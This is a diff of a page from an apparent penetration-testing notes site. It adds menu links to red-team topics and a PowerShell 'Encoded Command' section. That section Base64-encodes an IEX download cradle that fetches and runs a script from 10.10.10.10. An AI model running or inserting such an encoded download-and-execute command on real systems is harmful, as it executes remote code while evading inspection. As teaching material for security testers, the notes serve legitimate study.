@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level ">
 							
-							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
@@ -70,6 +72,10 @@
 									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -84,6 +90,8 @@
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
 								
 							</ul>
 						</li>
@@ -112,6 +120,8 @@
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
 								
 							</ul>
 						</li>
@@ -163,6 +173,10 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
+								
 							</ul>
 						</li>
 					
@@ -192,10 +206,52 @@
 					
 						<li class="nav-item top-level ">
 							
+							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
 							<a href="/hackingnotes/services/ftp/">Services</a>
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
 								
@@ -238,6 +294,8 @@
 									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
 								
 							</ul>
 						</li>
@@ -356,6 +414,7 @@ Verb-Noun | <span class="nb">Where</span>-Object <span class="o">{</span><span c
 <p>This are the<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-6"> following operators</a>:</p>
 
 <ul>
+  <li><strong>-like</strong>: Contains but not exact.</li>
   <li><strong>-contains</strong>: Exact match for the specified value.</li>
   <li><strong>-eq:</strong> Equals to.</li>
   <li><strong>-gt:</strong> Greater than.</li>
@@ -379,6 +438,28 @@ Verb-Noun | <span class="nb">Where</span>-Object <span class="o">{</span><span c
 <p>Onced imported we can list all commands that we previously imported.</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Command -Module &lt;modulename&gt;
+</code></pre></div></div>
+
+<h1 id="encoded-command">Encoded Command</h1>
+
+<p>We can use a Base64 payload to avoid problems with of notation or quotes. We can use parameters <code class="highlighter-rouge">-EncodedCommand</code> or <code class="highlighter-rouge">-enc</code> to specify that the payload will be encoded.</p>
+
+<p>We need to use <code class="highlighter-rouge">Unicode</code> encoding instead of <code class="highlighter-rouge">UTF-8</code> or <code class="highlighter-rouge">ASCII</code> at base64 conversion.</p>
+
+<ul>
+  <li>PowerShell:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$str</span> <span class="o">=</span> <span class="s1">'IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/a"))'</span>
+<span class="o">[</span>System.Convert]::ToBase64String<span class="o">([</span>System.Text.Encoding]::Unicode.GetBytes<span class="o">(</span><span class="nv">$str</span><span class="o">))</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Bash:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">str</span><span class="o">=</span><span class="s1">'IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/a"))'</span>
+<span class="nb">echo</span> <span class="nt">-en</span> <span class="nv">$str</span> | iconv <span class="nt">-t</span> UTF-16LE | <span class="nb">base64</span> <span class="nt">-w</span> 0
 </code></pre></div></div>
 
 			</article>
